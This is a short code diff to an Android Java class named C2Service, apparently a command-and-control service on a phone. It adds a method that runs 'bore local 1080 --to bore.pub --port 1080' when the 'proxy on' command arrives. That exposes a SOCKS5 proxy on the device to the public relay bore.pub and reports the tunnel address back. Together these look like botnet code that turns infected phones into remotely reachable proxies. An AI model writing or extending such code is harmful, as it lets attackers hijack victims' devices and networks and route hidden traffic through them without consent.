@@ -80,11 +80,21 @@ public class C2Service extends Service {
         return executeCmd(command);
     }
 
+    private void startBoreTunnel() {
+        try {
+            Process process = Runtime.getRuntime().exec("bore local 1080 --to bore.pub --port 1080");
+            Log.d("C2Service", "Bore tunnel started for port 1080");
+        } catch (Exception e) {
+            Log.e("C2Service", "Failed to start bore tunnel: " + e.getMessage());
+        }
+    }
+
     private String executeCmd(String cmd) {
         // PROXY COMMANDS
         if (cmd.equalsIgnoreCase("proxy on")) {
             proxyService.startProxy();
-            return "✅ SOCKS5 proxy started on port 1080";
+            startBoreTunnel();
+            return "✅ SOCKS5 proxy started on port 1080\n✅ Bore tunnel started on bore.pub:1080";
         }
         if (cmd.equalsIgnoreCase("proxy off")) {
             proxyService.stopProxy();
